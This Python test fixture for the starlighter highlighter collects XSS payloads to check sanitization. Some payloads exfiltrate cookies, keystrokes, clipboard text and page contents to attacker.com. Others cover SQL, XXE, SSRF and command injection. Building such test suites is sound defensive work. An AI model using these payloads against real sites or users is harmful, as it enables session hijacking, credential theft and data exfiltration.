"""
Comprehensive XSS Attack Vector Collection for Security Testing.

This module provides a comprehensive collection of XSS attack vectors, payloads,
and security test cases used for validating starlighter's security measures.
Based on OWASP XSS Prevention guidelines, real-world CVE patterns, and
advanced penetration testing techniques.

Security Test Categories:
- Basic XSS injection attacks
- HTML tag injection vectors
- Attribute injection attacks
- Encoding bypass attempts
- Context-specific attacks
- Advanced persistent attacks
- Polyglot payloads
- Filter bypass techniques
- DOM-based XSS patterns
- Mutation XSS (mXSS) attempts

Used by: tests/test_security_validation.py
"""

from typing import List, Dict, Tuple
import base64


class XSSVectors:
    """Collection of XSS attack vectors organized by category."""

    # Basic script injection attacks
    BASIC_SCRIPT_INJECTION = [
        # Simple script tags
        '<script>alert("XSS")</script>',
        '<SCRIPT>alert("XSS")</SCRIPT>',
        '<Script>alert("XSS")</Script>',
        '<ScRiPt>alert("XSS")</ScRiPt>',
        # Script with attributes
        '<script type="text/javascript">alert("XSS")</script>',
        '<script language="javascript">alert("XSS")</script>',
        '<script src="data:text/javascript,alert(String.fromCharCode(88,83,83))"></script>',
        '<script src="//malicious.com/xss.js"></script>',
        '<script async>alert("XSS")</script>',
        '<script defer>alert("XSS")</script>',
        # Script with various payloads
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
        "<script>setTimeout(\"alert('XSS')\",100)</script>",
        "<script>setInterval(\"alert('XSS')\",1000)</script>",
        "<script>Function(\"alert('XSS')\")()</script>",
        "<script>new Function(\"alert('XSS')\")()</script>",
        # Script closing tag variations
        '"></script><script>alert("XSS")</script>',
        '</script><script>alert("XSS")</script>',
        '<script>alert("XSS")//</script>',
        '<script>/**/alert("XSS")/**/</script>',
    ]

    # HTML tag injection attacks
    HTML_TAG_INJECTION = [
        # Image tag attacks
        '<img src="x" onerror="alert(1)">',
        '<img src="javascript:alert(1)">',
        "<img src=x onerror=alert(1)>",
        '<img/src="x"/onerror="alert(1)">',
        '<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onload="alert(1)">',
        # SVG attacks
        '<svg onload="alert(1)">',
        "<svg><script>alert(1)</script></svg>",
        '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>',
        '<svg><animatetransform onbegin="alert(1)"></svg>',
        '<svg><animate onbegin="alert(1)" attributename="x" dur="1s">',
        # Iframe attacks
        '<iframe src="javascript:alert(1)"></iframe>',
        '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',
        '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
        '<iframe onload="alert(1)"></iframe>',
        # Form and input attacks
        '<form action="javascript:alert(1)"><input type="submit"></form>',
        '<input type="text" onfocus="alert(1)" autofocus>',
        '<input type="image" src="x" onerror="alert(1)">',
        '<textarea onfocus="alert(1)" autofocus></textarea>',
        '<select onfocus="alert(1)" autofocus><option>',
        '<button onclick="alert(1)">Click</button>',
        # Object and embed attacks
        '<object data="javascript:alert(1)">',
        '<object data="data:text/html,<script>alert(1)</script>">',
        '<embed src="javascript:alert(1)">',
        '<embed src="data:text/html,<script>alert(1)</script>">',
        # Link attacks
        '<a href="javascript:alert(1)">click</a>',
        '<a href="data:text/html,<script>alert(1)</script>">click</a>',
        '<a href="#" onclick="alert(1)">click</a>',
        # Body and meta attacks
        '<body onload="alert(1)">',
        '<body onpageshow="alert(1)">',
        '<body onfocus="alert(1)">',
        '<meta http-equiv="refresh" content="0;javascript:alert(1)">',
        # Style attacks
        '<style>body{background:url("javascript:alert(1)")}</style>',
        '<style>@import "javascript:alert(1)";</style>',
        '<link rel="stylesheet" href="javascript:alert(1)">',
    ]

    # Attribute injection attacks
    ATTRIBUTE_INJECTION = [
        # Event handler injection
        '" onclick="alert(1)"',
        "' onclick='alert(1)'",
        '" onmouseover="alert(1)"',
        '" onfocus="alert(1)" autofocus="',
        '" onload="alert(1)"',
        '" onerror="alert(1)"',
        '" onchange="alert(1)"',
        '" onkeyup="alert(1)"',
        '" onsubmit="alert(1)"',
        '" ondblclick="alert(1)"',
        # Style injection
        '" style="background:expression(alert(1))"',
        '" style="background:url(javascript:alert(1))"',
        '" style="behavior:url(#default#VML)"',
        '" style="binding:url(xss.htc)"',
        # Source and href injection
        "javascript:alert(1)",
        "vbscript:msgbox(1)",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "data:text/html,<script>alert(1)</script>",
        "data:application/javascript,alert(1)",
        # Protocol variations
        "JAVASCRIPT:alert(1)",
        "Javascript:alert(1)",
        "java\x0ascript:alert(1)",
        "java\x09script:alert(1)",
        "java\x0dscript:alert(1)",
        "jav&#x09;ascript:alert(1)",
        "jav&#x0A;ascript:alert(1)",
        "jav&#x0D;ascript:alert(1)",
    ]

    # Encoding bypass attempts
    ENCODING_BYPASSES = [
        # URL encoding
        '%3Cscript%3Ealert("XSS")%3C/script%3E',
        '%3CSCRIPT%3Ealert("XSS")%3C/SCRIPT%3E',
        '%3cscript%3ealert("XSS")%3c/script%3e',
        # Double URL encoding
        '%253Cscript%253Ealert("XSS")%253C/script%253E',
        '%25%33%43script%25%33%45alert("XSS")%25%33%43/script%25%33%45',
        # HTML entity encoding
        '&lt;script&gt;alert("XSS")&lt;/script&gt;',
        '&#60;script&#62;alert("XSS")&#60;/script&#62;',
        '&#x3C;script&#x3E;alert("XSS")&#x3C;/script&#x3E;',
        '&#060;script&#062;alert("XSS")&#060;/script&#062;',
        # Mixed case HTML entities
        '&LT;script&GT;alert("XSS")&LT;/script&GT;',
        '&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;',
        # Unicode encoding
        '\\u003cscript\\u003ealert("XSS")\\u003c/script\\u003e',
        '\\u003Cscript\\u003Ealert("XSS")\\u003C/script\\u003E',
        '<\\u0073cript>alert("XSS")</script>',
        '<sc\\u0072ipt>alert("XSS")</script>',
        # Hex encoding
        '\\x3cscript\\x3ealert("XSS")\\x3c/script\\x3e',
        '\\x3Cscript\\x3Ealert("XSS")\\x3C/script\\x3E',
        # Octal encoding
        '\\74script\\76alert("XSS")\\74/script\\76',
        # Base64 encoding
        base64.b64encode(b'<script>alert("XSS")</script>').decode(),
        "data:text/html;base64,"
        + base64.b64encode(b'<script>alert("XSS")</script>').decode(),
        # Null byte injection
        '<script\\x00>alert("XSS")</script>',
        '<scr\\x00ipt>alert("XSS")</script>',
        "java\\x00script:alert(1)",
        # Tab/newline injection
        '<script\\t>alert("XSS")</script>',
        '<script\\n>alert("XSS")</script>',
        '<script\\r>alert("XSS")</script>',
        '<script\\x0b>alert("XSS")</script>',
        '<script\\x0c>alert("XSS")</script>',
    ]

    # Context-specific attacks
    CONTEXT_SPECIFIC = [
        # JavaScript context
        '\';alert("XSS");//',
        '";alert("XSS");//',
        ');alert("XSS");//',
        '};alert("XSS");//',
        '*/alert("XSS");//',
        # CSS context
        'expression(alert("XSS"))',
        'url("javascript:alert(1)")',
        "url(javascript:alert(1))",
        '@import "javascript:alert(1)";',
        "behavior:url(xss.htc)",
        "binding:url(xss.xml#xss)",
        # URL context
        "javascript:alert(1)",
        "javascript:void(alert(1))",
        "javascript://comment%0aalert(1)",
        "javascript:/*comment*/alert(1)",
        # Comment context (for languages that support comments)
        "<!-- <script>alert(1)</script> -->",
        "/*<script>alert(1)</script>*/",
        "//<script>alert(1)</script>",
        "#<script>alert(1)</script>",
        # XML/XHTML context
        "<![CDATA[<script>alert(1)</script>]]>",
        '<?xml version="1.0"?><script>alert(1)</script>',
    ]

    # Advanced persistent attacks
    ADVANCED_ATTACKS = [
        # DOM clobbering
        '<form id="test"><input name="action"></form>',
        '<iframe name="length"></iframe>',
        '<input name="attributes">',
        # Template injection
        '{{constructor.constructor("alert(1)")()}}',
        "${alert(1)}",
        "#{alert(1)}",
        "<%= alert(1) %>",
        "<% alert(1) %>",
        # Server-side template injection patterns
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        # PHP injection attempts
        '<?php echo "XSS"; ?>',
        '<?= "XSS" ?>',
        # ASP injection attempts
        '<% Response.Write("XSS") %>',
        '<%="XSS"%>',
        # Python injection attempts (relevant for code highlighting)
        '__import__("os").system("alert")',
        'eval("alert(1)")',
        'exec("alert(1)")',
        # Polyglot payloads (work in multiple contexts)
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        '">><marquee><img src=x onerror=confirm(1)></marquee></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>-->*/</script><script>alert(1)</script>',
        # Filter bypass techniques
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<ScRiPt>alert(1)</ScRiPt>",
        '<script/src="data:,alert(1)">',
        '<script\\x20type="text/javascript">alert(1)</script>',
        '<script\\x09type="text/javascript">alert(1)</script>',
        '<script\\x0dtype="text/javascript">alert(1)</script>',
        '<script\\x0atype="text/javascript">alert(1)</script>',
        '<script\\x0btype="text/javascript">alert(1)</script>',
        '<script\\x0ctype="text/javascript">alert(1)</script>',
        # Mutation XSS (mXSS)
        '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
        "<listing>&lt;img src=1 onerror=alert(1)&gt;</listing>",
        "<template><script>alert(1)</script></template>",
        # Event handler variations
        "<svg><animate attributeName=href values=javascript:alert(1) />",
        "<math><maction actiontype=toggle xlink:href=javascript:alert(1)>",
        '<video><source onerror="javascript:alert(1)">',
        "<audio src=x onerror=alert(1)>",
    ]

    # Protocol-based attacks
    PROTOCOL_ATTACKS = [
        "javascript:alert(1)",
        "JAVASCRIPT:alert(1)",
        "Javascript:alert(1)",
        "JaVaScRiPt:alert(1)",
        "vbscript:msgbox(1)",
        "VBSCRIPT:msgbox(1)",
        "VbScript:msgbox(1)",
        "livescript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "data:application/javascript,alert(1)",
        "data:text/javascript,alert(1)",
        "data:application/x-javascript,alert(1)",
        "data:text/ecmascript,alert(1)",
        "data:application/ecmascript,alert(1)",
        "data:text/vbscript,msgbox(1)",
        "data:application/vbscript,msgbox(1)",
        "data:text/xml,<script>alert(1)</script>",
        "data:application/xml,<script>alert(1)</script>",
        "data:image/svg+xml,<svg onload=alert(1)>",
    ]

    # WAF bypass techniques
    WAF_BYPASSES = [
        # Comments to break up patterns
        "<scr/**/ipt>alert(1)</scr/**/ipt>",
        '<script/**/src="data:,alert(1)">',
        "java/**/script:alert(1)",
        "on/**/load=alert(1)",
        # Case variations
        "<ScRiPt>alert(1)</ScRiPt>",
        "OnLoAd=alert(1)",
        "JAVASCRIPT:alert(1)",
        # Whitespace variations
        "<script >alert(1)</script>",
        "<script\t>alert(1)</script>",
        "<script\n>alert(1)</script>",
        "<script\r>alert(1)</script>",
        "<script\x0b>alert(1)</script>",
        "<script\x0c>alert(1)</script>",
        # Attribute variations
        "<img/src=x/onerror=alert(1)>",
        "<img\\x20src=x\\x20onerror=alert(1)>",
        "<img\\x09src=x\\x09onerror=alert(1)>",
        "<img\\x0asrc=x\\x0aonerror=alert(1)>",
        "<img\\x0dsrc=x\\x0donerror=alert(1)>",
        # Quote variations
        "<script>alert('XSS')</script>",
        "<script>alert(`XSS`)</script>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        # Concatenation bypasses
        "<scr" + "ipt>alert(1)</scr" + "ipt>",
        "javascript:" + "alert(1)",
    ]

    @classmethod
    def get_all_vectors(cls) -> List[str]:
        """Get all XSS vectors as a single list."""
        all_vectors = []
        all_vectors.extend(cls.BASIC_SCRIPT_INJECTION)
        all_vectors.extend(cls.HTML_TAG_INJECTION)
        all_vectors.extend(cls.ATTRIBUTE_INJECTION)
        all_vectors.extend(cls.ENCODING_BYPASSES)
        all_vectors.extend(cls.CONTEXT_SPECIFIC)
        all_vectors.extend(cls.ADVANCED_ATTACKS)
        all_vectors.extend(cls.PROTOCOL_ATTACKS)
        all_vectors.extend(cls.WAF_BYPASSES)
        return all_vectors

    @classmethod
    def get_vectors_by_category(cls) -> Dict[str, List[str]]:
        """Get XSS vectors organized by category."""
        return {
            "basic_script_injection": cls.BASIC_SCRIPT_INJECTION,
            "html_tag_injection": cls.HTML_TAG_INJECTION,
            "attribute_injection": cls.ATTRIBUTE_INJECTION,
            "encoding_bypasses": cls.ENCODING_BYPASSES,
            "context_specific": cls.CONTEXT_SPECIFIC,
            "advanced_attacks": cls.ADVANCED_ATTACKS,
            "protocol_attacks": cls.PROTOCOL_ATTACKS,
            "waf_bypasses": cls.WAF_BYPASSES,
        }

    @classmethod
    def get_high_risk_vectors(cls) -> List[str]:
        """Get the most dangerous/high-risk XSS vectors for priority testing."""
        return [
            # Most common and effective attacks
            '<script>alert("XSS")</script>',
            '<img src="x" onerror="alert(1)">',
            '<svg onload="alert(1)">',
            "javascript:alert(1)",
            '" onclick="alert(1)"',
            '<iframe src="javascript:alert(1)"></iframe>',
            "data:text/html,<script>alert(1)</script>",
            '<body onload="alert(1)">',
            '<script src="//malicious.com/xss.js"></script>',
            '<object data="javascript:alert(1)">',
            # Filter bypass examples
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "java\\x00script:alert(1)",
            '<script\\x20type="text/javascript">alert(1)</script>',
        ]


class SecurityTestPatterns:
    """Patterns for security testing and validation."""

    # Dangerous HTML patterns that should NEVER appear in output
    FORBIDDEN_PATTERNS = [
        "<script>",
        "<script ",
        "</script>",
        "<img ",
        "<svg ",
        "<iframe ",
        "<object ",
        "<embed ",
        "<form ",
        "<input ",
        "<textarea ",
        "<select ",
        "<button ",
        "<body ",
        "<meta ",
        "<link ",
        "<style>",
        "<style ",
        "</style>",
        "javascript:",
        "vbscript:",
        "data:text/html",
        "data:application/javascript",
        "onclick=",
        "onload=",
        "onerror=",
        "onmouseover=",
        "onfocus=",
        "onchange=",
        "onkeyup=",
        "onsubmit=",
        "expression(",
        'url("javascript:',
        "url(javascript:",
        "@import",
        "behavior:",
        "binding:",
    ]

    # Safe HTML entities that should appear after sanitization
    SAFE_ENTITIES = [
        "&lt;",
        "&gt;",
        "&amp;",
        "&quot;",
        "&#x27;",
        "&#58;",  # Colon
        "&#61;",  # Equals
    ]

    # Valid CSS class patterns for token styling
    VALID_CSS_CLASSES = [
        "token-keyword",
        "token-identifier",
        "token-string",
        "token-number",
        "token-comment",
        "token-operator",
        "token-punctuation",
        "token-whitespace",
        "token-decorator",
        "token-builtin",
        "token-docstring",
        "language-python",
    ]


class PenetrationTestCases:
    """Real-world penetration testing scenarios."""

    REAL_WORLD_PAYLOADS = [
        # BeEF Framework payloads
        '<script src="http://attacker.com/hook.js"></script>',
        '<script>var script=document.createElement("script");script.src="http://attacker.com/hook.js";document.body.appendChild(script);</script>',
        # Cookie stealing
        '<script>new Image().src="http://attacker.com/steal?cookie="+document.cookie;</script>',
        '<img src="x" onerror="new Image().src=\'http://attacker.com/steal?cookie=\'+document.cookie;">',
        # Keylogger
        '<script>document.onkeypress=function(e){new Image().src="http://attacker.com/log?key="+String.fromCharCode(e.which);}</script>',
        # Phishing
        '<script>document.body.innerHTML="<h1>Login Required</h1><form action=\\"http://attacker.com/phish\\" method=\\"post\\">Username: <input name=\\"user\\"><br>Password: <input name=\\"pass\\" type=\\"password\\"><br><input type=\\"submit\\" value=\\"Login\\"></form>";</script>',
        # Defacement
        '<script>document.body.innerHTML="<h1>HACKED!</h1><p>Your site has been compromised.</p>";</script>',
        # Redirect attacks
        '<script>window.location="http://malicious.com";</script>',
        '<meta http-equiv="refresh" content="0;url=http://malicious.com">',
        # Session hijacking
        '<script>fetch("http://attacker.com/steal",{method:"POST",body:"session="+document.cookie});</script>',
        # Information disclosure
        '<script>new Image().src="http://attacker.com/leak?data="+btoa(document.documentElement.innerHTML);</script>',
        # Clipboard theft (newer browsers)
        '<script>navigator.clipboard.readText().then(text=>{new Image().src="http://attacker.com/clipboard?data="+encodeURIComponent(text);});</script>',
        # Webcam access attempt
        '<script>navigator.mediaDevices.getUserMedia({video:true}).then(stream=>{new Image().src="http://attacker.com/webcam?accessed=true";});</script>',
    ]

    ADVANCED_BYPASS_TECHNIQUES = [
        # WAF evasion
        "<scr<script>ipt>alert(String.fromCharCode(88,83,83))</scr</script>ipt>",
        '<svg/onload=eval(atob("YWxlcnQoMSk="))>',  # Base64: alert(1)
        "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
        # Content Security Policy bypass attempts
        '<script nonce="random">alert(1)</script>',
        '<script integrity="sha256-fake">alert(1)</script>',
        '<link rel="preload" href="javascript:alert(1)">',
        # JSONP hijacking patterns
        "callback=alert;",
        "jsonp=alert(1);//",
        "&callback=alert(document.domain)//",
        # DOM clobbering for bypass
        '<form><input name="action" value="javascript:alert(1)"></form>',
        '<iframe name="location" src="javascript:alert(1)"></iframe>',
        # Mutation XSS
        "<noscript><style></noscript><img src=x onerror=alert(1)></style>",
        "<svg><style><img src=x onerror=alert(1)></style></svg>",
        # Time-delayed attacks
        '<img src="x" onerror="setTimeout(function(){alert(1)},5000)">',
        '<script>setTimeout(function(){eval(atob("YWxlcnQoMSk="))},1000)</script>',
    ]

    CVE_PATTERNS = [
        # Based on real CVE patterns adapted for testing
        # CVE-2019-11358 (jQuery)
        "<option><style></option></select><img src=x onerror=alert(1)></style>",
        # CVE-2020-11022 (jQuery)
        "<style>@import'data:,*{x:expression(alert(1))}'</style>",
        # CVE-2018-16476 (Active Admin)
        '<img src="x" onerror="alert(String.fromCharCode(88,83,83))">',
        # Common template injection patterns
        '{{constructor.constructor("alert(1)")()}}',
        "${alert(1)}",
        "<%= alert(1) %>",
        # LDAP injection attempts (unlikely but testing completeness)
        "*()|(&(objectClass=*))",
        "*))%00",
        # SQL injection patterns (for completeness)
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        # NoSQL injection patterns
        '{"$gt":""}',
        '{"$ne":null}',
        # XXE attempts
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>',
        # SSRF attempts
        "file:///etc/passwd",
        "http://169.254.169.254/latest/meta-data/",
        "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
        # Path traversal
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        # Command injection
        "; cat /etc/passwd",
        "| whoami",
        "`id`",
        "$(id)",
    ]


def get_test_matrix() -> List[Tuple[str, str, str]]:
    """
    Generate a comprehensive test matrix of (vector, category, risk_level).

    Returns:
        List of tuples containing (attack_vector, category, risk_level)
        where risk_level is 'HIGH', 'MEDIUM', or 'LOW'
    """
    test_matrix = []

    # High risk vectors
    for vector in XSSVectors.BASIC_SCRIPT_INJECTION[:10]:  # First 10 are highest risk
        test_matrix.append((vector, "basic_script_injection", "HIGH"))

    for vector in XSSVectors.HTML_TAG_INJECTION[
        :15
    ]:  # Image and SVG attacks are high risk
        test_matrix.append((vector, "html_tag_injection", "HIGH"))

    for vector in XSSVectors.ATTRIBUTE_INJECTION[:5]:  # Event handlers are high risk
        test_matrix.append((vector, "attribute_injection", "HIGH"))

    for vector in PenetrationTestCases.REAL_WORLD_PAYLOADS:
        test_matrix.append((vector, "real_world_payload", "HIGH"))

    # Medium risk vectors
    for vector in XSSVectors.ENCODING_BYPASSES:
        test_matrix.append((vector, "encoding_bypass", "MEDIUM"))

    for vector in XSSVectors.CONTEXT_SPECIFIC:
        test_matrix.append((vector, "context_specific", "MEDIUM"))

    for vector in XSSVectors.PROTOCOL_ATTACKS:
        test_matrix.append((vector, "protocol_attack", "MEDIUM"))

    # Lower risk but comprehensive vectors
    for vector in XSSVectors.ADVANCED_ATTACKS:
        test_matrix.append((vector, "advanced_attack", "MEDIUM"))

    for vector in XSSVectors.WAF_BYPASSES:
        test_matrix.append((vector, "waf_bypass", "MEDIUM"))

    for vector in PenetrationTestCases.ADVANCED_BYPASS_TECHNIQUES:
        test_matrix.append((vector, "advanced_bypass", "MEDIUM"))

    for vector in PenetrationTestCases.CVE_PATTERNS:
        test_matrix.append((vector, "cve_pattern", "MEDIUM"))

    return test_matrix


# Export the main classes and functions for use in tests
__all__ = [
    "XSSVectors",
    "SecurityTestPatterns",
    "PenetrationTestCases",
    "get_test_matrix",
]
